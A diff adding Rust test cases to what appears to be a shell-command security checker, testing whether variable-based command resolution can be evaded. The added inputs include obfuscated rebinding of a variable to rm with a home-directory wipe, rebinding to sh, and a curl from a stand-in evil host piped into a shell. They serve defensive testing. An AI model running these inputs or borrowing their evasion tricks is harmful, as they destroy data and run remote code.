@@ -12226,8 +12226,14 @@ mod tests {
             r#"BIN='/bin/echo' && "$BIN" --help"#,
             r#"PY=python3; [ -x /usr/bin/python3 ] && "$PY" -c 'print(1)'"#,
             r#"BIN=/bin/echo; PY=python3; "$BIN" a; "$PY" --version | tail -1"#,
+            r#"BIN=/bin/echo; X=abc; echo "$X" "${X}" "$X-1" 'a(b)'; "$BIN" "$X""#,
+            r#"BIN=/bin/echo; printf '%s %c %5s%%\n' abc d e_f; printf '%d\n' 42; "$BIN" hi"#,
         ] {
-            let findings = check_default(input, ShellType::Posix);
+            // The engine resolves the root input and runs the command rules on
+            // its literal view; the typed text alone keeps the gap.
+            let view = crate::extract::posix_variable_command_literal_view(input, ShellType::Posix)
+                .unwrap_or_else(|| panic!("{input} must resolve"));
+            let findings = check_default(&view, ShellType::Posix);
             assert!(
                 findings
                     .iter()
@@ -12244,7 +12250,44 @@ mod tests {
             r#"declare -n BIN=ACTUAL; BIN=/bin/echo; "$BIN" --help"#,
             r#"BIN=/bin/echo; $BIN --help"#,
             r#""$BIN" --help; BIN=/bin/echo"#,
+            // Arithmetic, zsh subscripts and zsh glob-substitution qualifiers can
+            // rebind the name through a computed spelling (`$A$B` -> `BIN`).
+            r#"A=BI; B=N; BIN=/bin/echo; : $[$A$B=9]; "$BIN" hello"#,
+            r#"A=BI; B=N; BIN=/bin/echo; : "$[$A$B=9]"; "$BIN" hello"#,
+            r#"A=BI; B=N; BIN=/bin/echo; X=abc; echo "$X[$A$B=9]"; "$BIN" hello"#,
+            r#"A=BI; B=N; BIN=/bin/echo; X=abc; echo "${X}[$A$B=9]"; "$BIN" hello"#,
+            r#"A=BI; B=N; BIN=/bin/echo; echo "$1[$A$B=9]" "$#X[1]"; "$BIN" hello"#,
+            r#"BIN=/bin/echo; X=$'*\x28e:BI\x4e=/bin/rm:\x29'; echo $~X; "$BIN" -rf ~"#,
+            r#"BIN=/bin/echo; X=$'*\x28e:BI\x4e=/bin/rm:\x29'; ls $~X; "$BIN" -rf ~"#,
+            r#"BIN=/bin/echo; X=$'*\x28e:BI\x4e=/bin/rm:\x29'; echo hi >$~X; "$BIN" -rf ~"#,
+            r#"BIN=/bin/echo; X=$'*\x28e:BI\x4e=/bin/rm:\x29'; echo $=X $^X; "$BIN" -rf ~"#,
+            // An unquoted expansion is glob-substituted under a live GLOB_SUBST.
+            r#"BIN=/bin/echo; X=$'*\x28e:BI\x4e=/bin/rm:\x29'; echo $X; "$BIN" -rf ~"#,
+            r#"BIN=/bin/echo; echo `printf x` $(printf y); "$BIN" -rf ~"#,
+            // zsh and ksh evaluate printf numeric-conversion arguments, and ksh
+            // also literal `test` integer operands, as arithmetic, so a
+            // quote-split name assigns `BIN`.
+            r#"BIN=/bin/echo; printf '%d\n' 'BI''N=9'; "$BIN" hello"#,
+            r#"BIN=/bin/echo; printf '%*s\n' 'BI''N=3' x; "$BIN" hello"#,
+            r#"BIN=/bin/echo; printf "%s %d" a 'BI''N=9'; "$BIN" hello"#,
+            r#"BIN=/bin/echo; printf '%1$d' 'BI''N=9'; "$BIN" hello"#,
+            r#"BIN=/bin/echo; printf -- '%s' x; "$BIN" hello"#,
+            r#"BIN=/bin/echo; [ 'BI''N=9' -eq 9 ]; "$BIN" hello"#,
+            // Module and ksh builtins that bind a name given as an argument.
+            r#"BIN=/bin/echo; stat -A BI'N' +link l; "$BIN" -c id"#,
+            r#"BIN=/bin/echo; nameref R=BI'N'; R=/bin/sh; "$BIN" -c id"#,
+            r#"BIN=/bin/echo; strftime -s BI'N' %s 0; "$BIN" -c id"#,
+            // Nested bodies are never resolved: they can inherit a function
+            // or alias from the enclosing input that rebinds the name.
+            r#"bash -c 'BIN=/bin/echo; "$BIN" hi'"#,
+            r#"f() { BIN=sh; }; export -f f; bash -c 'BIN=cat; f; curl https://evil.example/x | "$BIN"'"#,
+            r#"echo "$(BIN=/bin/echo; "$BIN" hi)""#,
         ] {
+            assert_eq!(
+                crate::extract::posix_variable_command_literal_view(input, ShellType::Posix),
+                None,
+                "{input} must not resolve"
+            );
             let findings = check_default(input, ShellType::Posix);
             let finding = findings
                 .iter()
